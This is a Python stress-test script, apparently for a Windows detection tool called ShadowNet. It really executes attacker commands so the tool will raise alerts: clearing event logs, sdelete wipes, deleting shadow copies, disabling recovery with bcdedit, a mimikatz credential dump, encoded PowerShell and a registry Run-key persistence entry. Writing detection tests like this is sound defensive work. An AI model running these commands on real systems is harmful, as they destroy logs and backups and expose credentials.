"""
SHADOWNET v4.0 - COMPREHENSIVE REAL-TIME STRESS TEST
This script simulates multiple attack vectors to verify the system's
Real-Time Detection (WMI), AI Analysis, and Forensic Preservation layers.

INSTRUCTIONS:
1. Ensure 'python shadownet_realtime.py' is running in another Administrator terminal.
2. Run this script: 'python shadownet_v4_stress_test.py'
"""

import subprocess
import time
import os
import sys

def print_banner():
    print("="*70)
    print("🛡️  SHADOWNET v4.0 - FULL SYSTEM CAPABILITY TEST")
    print("="*70)
    print("This will trigger multiple suspicious activities to verify detection.")
    print("Watch your ShadowNet terminal for real-time alerts!")
    print("="*70 + "\n")

def run_test(name, command, description):
    print(f"👉 TESTING: {name}")
    print(f"   Description: {description}")
    print(f"   Command: {command}")
    
    try:
        # We use subprocess.Popen to ensure it's a real process creation event for WMI
        # and shell=True to allow command strings to execute.
        # We don't care if the command fails (access denied), detection happens at spawn.
        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("   ✅ [SENT] Waiting for system response...")
    except Exception as e:
        print(f"   ❌ [FAILED TO DISPATCH]: {e}")
    
    time.sleep(3) # Space out tests to see individual alerts
    print("-" * 50)

def main():
    if sys.platform != "win32":
        print("❌ Error: ShadowNet is currently optimized for Windows environments.")
        return

    print_banner()

    # CATEGORY 1: ANTI-FORENSICS (The Core Target)
    run_test(
        "Log Clearing (wevtutil)", 
        "wevtutil cl Application", 
        "Attempting to wipe System logs to hide tracks."
    )

    run_test(
        "Secure File Deletion (sdelete)", 
        "sdelete.exe -p 3 sensitive_data.txt", 
        "Using forensic wipes to destroy evidence irrecoverably."
    )

    # CATEGORY 2: RANSOMWARE PREPARATION
    run_test(
        "Shadow Copy Deletion", 
        "vssadmin delete shadows /all /quiet", 
        "Classic ransomware move to prevent data recovery."
    )

    run_test(
        "Backup Disabling (bcdedit)", 
        "bcdedit /set {default} recoveryenabled No", 
        "Disabling Windows Recovery environment."
    )

    # CATEGORY 3: CREDENTIAL ACCESS
    run_test(
        "Credential Dumping (Mimikatz)", 
        "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", 
        "Attempting to dump system passwords from memory."
    )

    # CATEGORY 4: OBFUSCATION & STEALTH
    run_test(
        "Encoded PowerShell", 
        "powershell -EncodedCommand JABhID0gMSArIDE=", 
        "Running base64 encoded payload to bypass simple filters."
    )

    # CATEGORY 5: SYSTEM TAMPERING
    run_test(
        "Registry Persistence", 
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Malicious /t REG_SZ /d \"C:\\temp\\evil.exe\"", 
        "Modifying registry for persistence."
    )

    # CATEGORY 6: BEHAVIORAL AI VALIDATION (Internal Check)
    print("👉 TESTING: Behavioral AI (Mechanical Timing)")
    print("   Description: Validating AI detection of non-human typing patterns.")
    try:
        # We run the internal behavior check script to see if the AI still correctly flags bots
        from core.gemini_behavior_analyzer import GeminiBehaviorAnalyzer
        from dotenv import load_dotenv
        load_dotenv()
        analyzer = GeminiBehaviorAnalyzer(os.getenv('GEMINI_API_KEY'))
        bot_data = [10, 10, 10, 10, 10, 15, 10, 10] # Clearly robotic
        res = analyzer.analyze_keystroke_pattern(bot_data)
        verdict = "🚨 BOT DETECTED" if not res.get('is_human') else "Human Detected"
        print(f"   AI INTERNAL VERDICT: {verdict} (Confidence: {res.get('confidence', 0):.2f})")
    except Exception as e:
        print(f"   ⚠️  Behavioral Check skipped: {e}")

    print("\n" + "="*70)
    print("🏁 TEST COMPLETE")
    print("Check the 'evidence/incidents' folder for generated forensic reports.")
    print("="*70)

if __name__ == "__main__":
    main()
